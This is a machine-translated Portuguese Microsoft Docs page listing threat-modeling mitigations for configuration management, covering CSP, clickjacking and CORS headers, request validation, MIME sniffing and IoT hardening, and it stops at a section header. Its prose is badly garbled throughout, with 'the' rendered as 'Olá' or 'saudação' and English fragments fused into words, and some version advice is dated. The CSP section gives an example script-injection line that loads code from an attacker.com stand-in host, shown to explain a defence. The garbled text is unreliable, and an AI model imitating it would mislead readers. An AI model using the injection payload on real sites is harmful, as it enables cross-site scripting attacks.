---
title: "aaaConfiguration de gerenciamento - ferramenta de modelagem de ameaça Microsoft - Azure | Microsoft Docs"
description: "reduções de ameaças expostas em Olá, ferramenta de modelagem de ameaça"
services: security
documentationcenter: na
author: RodSan
manager: RodSan
editor: RodSan
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 08/17/2017
ms.author: rodsan
ms.openlocfilehash: 77aa4352fa61e928a1b7a4ff1d488a55d3d9b970
ms.sourcegitcommit: 523283cc1b3c37c428e77850964dc1c33742c5f0
ms.translationtype: MT
ms.contentlocale: pt-BR
ms.lasthandoff: 10/06/2017
---
# <a name="security-frame-configuration-management--mitigations"></a>Estrutura de segurança: Gerenciamento de configurações | Atenuações 
| Produto/serviço | Artigo |
| --------------- | ------- |
| **Aplicativo Web** | <ul><li>[Implementar a Política de Segurança de Conteúdo (CSP) e desabilitar o JavaScript embutido](#csp-js)</li><li>[Habilitar o filtro XSS do navegador](#xss-filter)</li><li>[Aplicativos ASP.NET devem desabilitar o rastreamento e depuração toodeployment anterior](#trace-deploy)</li><li>[Acessar JavaScripts de terceiros somente de fontes confiáveis](#js-trusted)</li><li>[Garantir que as páginas ASP.NET autenticadas incluam defesas contra adulterações de interface do usuário ou furto de clique](#ui-defenses)</li><li>[Garantir que apenas fontes confiáveis sejam permitidas se o CORS estiver habilitado em aplicativos Web do ASP.NET](#cors-aspnet)</li><li>[Habilitar o atributo ValidateRequest em páginas ASP.NET](#validate-aspnet)</li><li>[Usar as versões mais recentes de bibliotecas JavaScript hospedadas localmente](#local-js)</li><li>[Desabilitar a detecção automática de MIME](#mime-sniff)</li><li>[Remover cabeçalhos de servidor padrão no Windows Azure Web Sites tooavoid a impressão digital](#standard-finger)</li></ul> |
| **Banco de dados** | <ul><li>[Configurar um Firewall do Windows para acesso ao Mecanismo de Banco de Dados](#firewall-db)</li></ul> |
| **API da Web** | <ul><li>[Garantir que apenas fontes confiáveis sejam permitidas se o CORS estiver habilitado na API Web ASP.NET](#cors-api)</li><li>[Criptografar as seções dos arquivos de configuração da API Web que contêm dados confidenciais](#config-sensitive)</li></ul> |
| **Dispositivo IoT** | <ul><li>[Garantir que todas as interfaces de administrador sejam protegidas com credenciais fortes](#admin-strong)</li><li>[Garantir que um código desconhecido não seja executado em dispositivos](#unknown-exe)</li><li>[Criptografar o sistema operacional e partições adicionais do dispositivo IoT com o BitLocker](#partition-iot)</li><li>[Certifique-se de que somente Olá mínimo serviços/recursos estão habilitados em dispositivos](#min-enable)</li></ul> |
| **Gateway de Campo de IoT** | <ul><li>[Criptografar o sistema operacional e partições adicionais do Gateway de Campo IoT com o BitLocker](#field-bit-locker)</li><li>[Certifique-se de que as credenciais de logon padrão saudação do gateway de campo Olá sejam alteradas durante a instalação](#default-change)</li></ul> |
| **Gateway de Nuvem IoT** | <ul><li>[Certifique-se de que esse Gateway de nuvem Olá implementa um firmware de dispositivos do processo tookeep Olá conectado backup toodate](#cloud-firmware)</li></ul> |
| **Limite de confiança de computador** | <ul><li>[Garantir que os controles de segurança de ponto de extremidade estejam configurados nos dispositivos de acordo com as políticas organizacionais](#controls-policies)</li></ul> |
| **Armazenamento do Azure** | <ul><li>[Garantir o gerenciamento seguro das chaves de acesso do Armazenamento do Azure](#secure-keys)</li><li>[Garantir que apenas fontes confiáveis sejam permitidas se o CORS estiver habilitado no Armazenamento do Azure](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Habilitar o recurso de limitação do serviço WCF](#throttling)</li><li>[Divulgação de informações do WCF por meio de metadados](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Implementar a Política de Segurança de Conteúdo (CSP) e desabilitar o JavaScript embutido

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicativo Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Uma política de segurança de tooContent de Introdução](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [referência de política de segurança de conteúdo](http://content-security-policy.com/), [recursos de segurança](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [política de segurança Introdução toocontent](https://docs.webplatform.org/wiki/tutorials/content-security-policy), [posso usar o CSP?](http://caniuse.com/#feat=contentsecuritypolicy) |
| **Etapas** | <p>Política de segurança de conteúdo (CSP) é um defesa no mecanismo de segurança, um W3C padrão, que permite o controle de toohave de proprietários de aplicativo de web Olá conteúdo incorporado em seu site. CSP é adicionado como um cabeçalho de resposta HTTP no servidor de web hello e é imposto no lado do cliente Olá por navegadores. Ela é uma política baseada na lista de permissões; um site pode informar um conjunto de domínios confiáveis, dos quais conteúdos ativos, como JavaScript, podem ser carregados.</p><p>CSP fornece Olá benefícios de segurança a seguir:</p><ul><li>**Proteção contra XSS:** se uma página é vulnerável tooXSS, um invasor pode explorar formas 2:<ul><li>Injetar `<script>malicious code</script>`: Esta exploração não funcione devido da tooCSP base de dados de restrição-1</li><li>Injetar `<script src=”http://attacker.com/maliciousCode.js”/>`: Esta exploração não funcionará como domínio de invasor controlado Olá não estará na lista de permissões do CSP de domínios</li></ul></li><li>**Controle sobre a pesquisa por dados:** se algum conteúdo mal-intencionado em uma página da Web tenta site externo do tooconnect tooan e roubar dados, conexão Olá será anulada pelo CSP. Isso ocorre porque o domínio de destino Olá não estará na lista de permissões do CSP</li><li>**Defesa contra jacking clique:** jacking clique é uma técnica de ataque com o qual um adversário pode quadro um site original e forçar os usuários tooclick em elementos de interface do usuário. Para se proteger contra o furto de clique atualmente, basta configurar um cabeçalho de resposta X-Frame-Options. Nem todos os navegadores respeitam esse cabeçalho e vai CSP encaminhamento será um toodefend de maneira padrão contra jacking clique em</li><li>**Relatório de ataque em tempo real:** se houver um ataque de injeção em um site habilitado CSP, navegadores irá disparar automaticamente um ponto de extremidade notificação tooan configurado no servidor Web de saudação. Dessa forma, a CSP atua como um sistema de aviso em tempo real.</li></ul> |

### <a name="example"></a>Exemplo
Política de exemplo: 
```C#
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Essa política permite tooload de scripts somente a partir do aplicativo da web hello server e do google analytics server. Os scripts carregados em qualquer outro site serão rejeitados. Quando CSP está habilitado em um site, hello recursos a seguir são ataques XSS de toomitigate desabilitado automaticamente. 

### <a name="example"></a>Exemplo
Os scripts embutido não serão executados. Veja abaixo exemplos de scripts embutidos: 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Exemplo
As cadeias de caracteres não serão avaliadas como código. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Habilitar o filtro XSS do navegador

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicativo Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Filtro de proteção contra XSS](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Etapas** | <p>Controles de configuração do cabeçalho de resposta de proteção de XSS X Olá filtro de scripts entre sites do navegador. Esse cabeçalho de resposta pode ter valores os seguintes valores:</p><ul><li>`0:`Isso irá desabilitar o filtro de saudação</li><li>`1: Filter enabled`Se for detectado um ataque de script entre sites, em um ataque de saudação do toostop ordem, navegador hello serão Limpar página Olá</li><li>`1: mode=block : Filter enabled`. Em vez de limpar página hello, quando um ataque XSS é detectado, o navegador de Olá impedirá a renderização de página Olá</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. navegador Olá será corrigir a violação de Olá de página e relatório hello.</li></ul><p>Essa é uma função de hexavalente utilizando CSP violação relatórios toosend detalhes tooa URI de sua escolha. Olá últimas 2 opções são consideradas valores seguros.</p>|

## <a id="trace-deploy"></a>Aplicativos ASP.NET devem desabilitar o rastreamento e depuração toodeployment anterior

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicativo Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Visão geral da depuração do ASP.NET](http://msdn2.microsoft.com/library/ms227556.aspx), [Visão geral do rastreamento do ASP.NET](http://msdn2.microsoft.com/library/bb386420.aspx), [Como: ativar o rastreamento para um aplicativo do ASP.NET](http://msdn2.microsoft.com/library/0x5wc973.aspx), [Como: habilitar a depuração de aplicativos do ASP.NET](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Etapas** | Quando o rastreamento está habilitado para a página Olá, cada navegador solicitá-la também obtém as informações de rastreamento de saudação que contém dados sobre o estado interno do servidor e o fluxo de trabalho. Elas podem ser informações confidenciais de segurança. Quando a depuração está habilitada para a página de hello, erros ocorrendo no resultado de servidor de saudação em um dados de rastreamento de pilha completos apresentados toohello navegador. Dados podem expor informações confidenciais sobre o fluxo de trabalho do servidor de saudação. |

## <a id="js-trusted"></a>Acessar JavaScripts de terceiros somente de fontes confiáveis

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicativo Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Etapas** | os JavaScripts de terceiros devem ser referenciados somente de fontes confiáveis. pontos de extremidade de referência Olá devem sempre ser sobre SSL. |

## <a id="ui-defenses"></a>Garantir que as páginas ASP.NET autenticadas incluam defesas contra adulterações de interface do usuário ou furto de clique

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicativo Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Folha de dados do OWASP sobre mecanismos de proteção contra furto de clique](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [Internals IE – Combatendo o furto de clique com X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-click-jacking-with-x-frame-options/) |
| **Etapas** | <p>Clique em jacking, também conhecido como "ataque de reparos da interface do usuário," é quando um invasor usa várias camadas transparente ou opaco tootrick um usuário clicar em um botão ou um link em outra página quando eles foram pretendendo tooclick na página de nível superior de saudação.</p><p>Esse sistema em camadas é obtido pela criação de uma página mal-intencionada com um iframe, que carrega a página da vítima hello. Assim, o invasor Olá é "captura" clica destinam-se para sua página e roteá-los página tooanother, provavelmente pertencente a outro aplicativo, domínio ou ambos. tooprevent jacking clique ataques, conjunto Olá adequada X-Frame-Options cabeçalhos de resposta HTTP que instruem Olá navegador toonot permitem quadros de outros domínios</p>|

### <a name="example"></a>Exemplo
cabeçalho de X-FRAME-OPTIONS Olá pode ser definido por meio do Web. config do IIS. O trecho de código do arquivo web.config para sites que nunca devem ser enquadrados: 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Exemplo
Páginas de código da Web. config para sites que só deve ser estruturado na Olá mesmo domínio: 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>Garantir que apenas fontes confiáveis sejam permitidas se o CORS estiver habilitado em aplicativos Web do ASP.NET

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicativo Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Web Forms, MVC5 |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Etapas** | <p>Segurança do navegador impede que uma página da web façam o domínio de tooanother de solicitações do AJAX. Essa restrição é chamada política de mesma origem hello e impede que um site mal-intencionado lendo dados confidenciais de outro site. No entanto, às vezes, talvez seja necessário tooexpose APIs com segurança que outros sites podem consumir. Com o compartilhamento de recursos entre a origens (CORS) é um padrão de W3C que permite que um servidor de política de mesma origem toorelax hello. Usando o CORS, um servidor pode explicitamente permitir algumas solicitações entre origens e rejeitar outras.</p><p>O CORS é mais seguro e flexível do que técnicas anteriores, como o JSONP. Essencialmente, habilitar o CORS converte tooadding alguns cabeçalhos de resposta HTTP (Access - Control-*) toohello aplicativo de web e isso podem ser feitos de duas maneiras.</p>|

### <a name="example"></a>Exemplo
Se houver acesso tooWeb.config, CORS podem ser adicionado por meio de saudação de código a seguir: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="http://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Exemplo
Se o acesso tooweb.config não estiver disponível, pode ser configurado CORS adicionando Olá CSharp código a seguir: 
```C#
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
```

Configure a observação que é crítico tooensure que Olá lista de origens no atributo "Access-Control-Allow-Origin" tooa finito e confiáveis o conjunto de origens. Falha tooconfigure nesse inadequadamente (por exemplo, definir o valor de saudação como ' *') permitirá sites mal-intencionados tootrigger entre solicitações origens aplicativo da web de toohello > sem quaisquer restrições, tornando Olá aplicativo vulnerável tooCSRF ataques. 

## <a id="validate-aspnet"></a>Habilitar o atributo ValidateRequest em páginas ASP.NET

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicativo Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Web Forms, MVC5 |
| **Atributos**              | N/D  |
| **Referências**              | [Solicitar validação - evitando ataques de script](http://www.asp.net/whitepapers/request-validation) |
| **Etapas** | <p>Validação de solicitação, um recurso do ASP.NET desde a versão 1.1, impede que o servidor de saudação aceitando o conteúdo HTML não codificado que contém. Esse recurso destina-se toohelp impedir que alguns ataques de injeção de script no qual código de script de cliente ou HTML pode ser inadvertidamente enviadas tooa server, armazenados e apresentados tooother usuários. Ainda recomendamos que você valide todos os dados de entrada e os codifique com HTML quando for apropriado.</p><p>Validação de solicitação é executada comparando a lista de tooa todos os dados de entrada de valores potencialmente perigosos. Se uma correspondência for encontrada, o ASP.NET gera uma `HttpRequestValidationException`. Por padrão, o recurso de validação de solicitação está habilitado.</p>|

### <a name="example"></a>Exemplo
No entanto, esse recurso pode ser desabilitado no nível da página: 
```XML
<%@ Page validateRequest="false" %> 
```
ou no nível do aplicativo: 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Observe que o recurso de validação de solicitação não tem suporte no pipeline do MVC6 nem faz parte dele. 

## <a id="local-js"></a>Usar as versões mais recentes de bibliotecas JavaScript hospedadas localmente

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicativo Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Etapas** | <p>Os desenvolvedores que usam bibliotecas JavaScript padrão, como a JQuery, devem usar as versões aprovadas das bibliotecas JavaScript comuns que não contêm falhas de segurança conhecidas. Uma prática recomendada é toouse hello mais mais recente das bibliotecas de hello, já que eles contêm correções de segurança de vulnerabilidades conhecidas em suas versões mais antigas.</p><p>Se a versão mais recente da saudação não pode ser usado devido a motivos de toocompatibility, Olá abaixo versões mínimas deve ser usado.</p><p>Versões mínimas aceitáveis:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery Validate 1.9</li><li>JQuery Mobile 1.0.1</li><li>JQuery Cycle 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Ajax Control Toolkit**<ul><li>Ajax Control Toolkit 40412</li></ul></li><li>**ASP.NET Web Forms e Ajax**<ul><li>ASP.NET Web Forms e Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Nunca carregue quaisquer bibliotecas JavaScript de sites externos, como CDNs públicas.</p>|

## <a id="mime-sniff"></a>Desabilitar a detecção automática de MIME

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicativo Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Segurança do IE8 parte V: proteção abrangente](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [Tipo de MIME](http://en.wikipedia.org/wiki/Mime_type) |
| **Etapas** | cabeçalho Olá X conteúdo-tipo de opções é um cabeçalho HTTP que permite aos desenvolvedores toospecify que seu conteúdo não deve ser detectados MIME. Esse cabeçalho é projetado toomitigate ataques de detecção de MIME. Para cada página que pode conter conteúdo controlável do usuário, você deve usar o hello HTTP cabeçalho X-conteúdo-tipo-opções: nosniff. cabeçalho necessário de saudação de tooenable globalmente para todas as páginas no aplicativo hello, você pode fazer um dos seguintes Olá|

### <a name="example"></a>Exemplo
Adicione cabeçalho Olá no arquivo Web. config de saudação se o aplicativo hello é hospedado pelo Internet Information Services (IIS) 7 em diante. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Exemplo
Adicionar cabeçalho Olá Olá aplicativo global\_BeginRequest 
```C#
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Exemplo
Implementar o módulo HTTP personalizado. 
```C#
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Exemplo
Você pode habilitar o cabeçalho de saudação necessário apenas para páginas específicas, adicionando-tooindividual respostas: 

```C#
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Remover cabeçalhos de servidor padrão no Windows Azure Web Sites tooavoid a impressão digital

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicativo Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | Tipo de ambiente - Azure |
| **Referências**              | [Removendo cabeçalhos de servidor padrão nos sites do Microsoft Azure](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Etapas** | Cabeçalhos como servidor X-alimentado-por, X-AspNet-Version revelam informações sobre servidor de saudação e Olá tecnologias subjacentes. É recomendável toosuppress esses cabeçalhos, evitando assim que a impressão digital Olá aplicativo |

## <a id="firewall-db"></a>Configurar um Firewall do Windows para acesso ao Mecanismo de Banco de Dados

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Banco de dados | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | SQL Azure, OnPrem |
| **Atributos**              | N/D, Versão do SQL - V12 |
| **Referências**              | [Como tooconfigure um SQL Azure banco de dados firewall](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [configurar um Firewall do Windows para acesso ao mecanismo de banco de dados](https://msdn.microsoft.com/library/ms175043) |
| **Etapas** | Sistemas de firewall ajudam a impedir que os recursos de toocomputer de acesso não autorizado. tooaccess uma instância do hello mecanismo de banco de dados do SQL Server por meio de um firewall, você deve configurar o firewall Olá no computador Olá executando tooallow acesso ao SQL Server |

## <a id="cors-api"></a>Garantir que apenas fontes confiáveis sejam permitidas se o CORS estiver habilitado na API Web ASP.NET

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | MVC 5 |
| **Atributos**              | N/D  |
| **Referências**              | [Permitindo solicitações entre origens na API Web ASP.NET 2](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [API Web ASP.NET - suporte ao CORS na API Web ASP.NET 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Etapas** | <p>Segurança do navegador impede que uma página da web façam o domínio de tooanother de solicitações do AJAX. Essa restrição é chamada política de mesma origem hello e impede que um site mal-intencionado lendo dados confidenciais de outro site. No entanto, às vezes, talvez seja necessário tooexpose APIs com segurança que outros sites podem consumir. Com o compartilhamento de recursos entre a origens (CORS) é um padrão de W3C que permite que um servidor de política de mesma origem toorelax hello.</p><p>Usando o CORS, um servidor pode explicitamente permitir algumas solicitações entre origens e rejeitar outras. O CORS é mais seguro e flexível do que técnicas anteriores, como o JSONP.</p>|

### <a name="example"></a>Exemplo
Olá App_Start/WebApiConfig.cs, adiciona Olá seguinte código toohello WebApiConfig.Register método 
```C#
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Exemplo
EnableCors atributo pode ser aplicado tooaction métodos em um controlador da seguinte maneira: 

```C#
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Observe que ele é crítico tooensure que Olá lista de origens no atributo EnableCors é defina tooa finito e confiáveis o conjunto de origens. Falha tooconfigure nesse inadequadamente (por exemplo, definir o valor de saudação como ' *') permitirá tootrigger sites mal-intencionados entre origem solicitações toohello API sem quaisquer restrições, >, tornando o hello API tooCSRF vulnerável ataques. O atributo EnableCors pode ser decorado no nível do controlador. 

### <a name="example"></a>Exemplo
toodisable CORS em um método específico em uma classe, Olá DisableCors atributo pode ser usado, conforme mostrado abaixo: 
```C#
[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of hello [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | MVC 6 |
| **Atributos**              | N/D  |
| **Referências**              | [Permitindo solicitações entre origens (CORS) no ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) |
| **Etapas** | <p>No ASP.NET 1.0, o CORS pode ser habilitado com o middleware ou o MVC. Ao usar o hello CORS do MVC tooenable mesmos serviços CORS são usados, mas Olá middleware CORS não é.</p>|

**Abordagem 1** habilitando CORS com middleware: tooenable CORS para todo o aplicativo hello adicionar pipeline Olá CORS middleware toohello solicitação usando o método de extensão UseCors hello. Uma política entre origens pode ser especificada ao adicionar Olá CORS middleware usando Olá CorsPolicyBuilder classe. Há dois toodo de maneiras isso:

### <a name="example"></a>Exemplo
Olá primeiro é toocall UseCors com uma expressão lambda. lambda Olá usa um objeto de CorsPolicyBuilder: 
```C#
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("http://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Exemplo
Olá segundo é toodefine um ou mais nomeado CORS políticas e política de hello, em seguida, selecione por nome em tempo de execução. 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("http://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Abordagem 2** habilitando CORS no MVC: os desenvolvedores também podem usar o MVC tooapply CORS específicos por ação, por controlador ou globalmente para todos os controladores.

### <a name="example"></a>Exemplo
Cada ação: toospecify uma política CORS para uma ação específica Adicionar ação de toohello atributo Olá [EnableCors]. Especifique o nome de diretiva de saudação. 
```C#
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Exemplo
Por controlador: 
```C#
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Exemplo
Globalmente: 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Observe que ele é crítico tooensure que Olá lista de origens no atributo EnableCors é defina tooa finito e confiáveis o conjunto de origens. Falha tooconfigure nesse inadequadamente (por exemplo, definir o valor de saudação como ' *') permitirá tootrigger sites mal-intencionados entre origem solicitações toohello API sem quaisquer restrições, >, tornando o hello API tooCSRF vulnerável ataques. 

### <a name="example"></a>Exemplo
toodisable CORS para um controlador ou ação, usar o atributo de saudação [DisableCors]. 
```C#
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Criptografar as seções dos arquivos de configuração da API Web que contêm dados confidenciais

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase do SDL**               | Implantação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Como: Criptografar seções de configuração no ASP.NET 2.0 usando DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [especificando um provedor de configuração protegida](https://msdn.microsoft.com/library/68ze1hb2.aspx), [segredos de aplicativo tooprotect usando o Cofre de chaves do Azure](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Etapas** | Arquivos de configuração como Olá Web. config, appSettings. JSON são geralmente usados toohold de informações confidenciais, incluindo nomes de usuário, senhas, cadeias de conexão de banco de dados e chaves de criptografia. Se você não proteger essas informações, o aplicativo é vulnerável tooattackers ou usuários mal-intencionados, obtenção de informações confidenciais, como nomes de conta de usuário e senhas, nomes de banco de dados e nomes de servidor. Com base no tipo de implantação da saudação (azure/local), criptografe seções confidenciais de saudação do arquivos de configuração usando a DPAPI ou serviços, como o Cofre de chaves do Azure. |

## <a id="admin-strong"></a>Garantir que todas as interfaces de administrador sejam protegidas com credenciais fortes

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase do SDL**               | Implantação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Etapas** | Interfaces administrativas qualquer dispositivo hello ou expõe de gateway de campo deve ser protegidas usando credenciais fortes. Outras interfaces expostas, como Wi-Fi, SSH, compartilhamentos de arquivos e FTP, também devem ser protegidas com credenciais fortes. Senhas fracas padrão não devem ser usadas. |

## <a id="unknown-exe"></a>Garantir que um código desconhecido não seja executado em dispositivos

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Habilitar a inicialização segura e a Criptografia do dispositivo do BitLocker no Windows 10 IoT Core](https://developer.microsoft.com/windows/iot/win10/sb_bl) |
| **Etapas** | Inicialização segura de UEFI restringe sistema Olá tooonly permitir a execução de binários assinados por uma autoridade especificada. Esse recurso impede código desconhecido que está sendo executado na plataforma hello e diminuir potencialmente a postura de segurança de saudação do mesmo. Habilitar a inicialização segura de UEFI e restringir a lista de saudação de autoridades de certificação confiáveis para assinatura de código. Assinar todo o código que é implantado no dispositivo hello usando uma das autoridades confiável de saudação. |

## <a id="partition-iot"></a>Criptografar o sistema operacional e partições adicionais do dispositivo IoT com o BitLocker

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
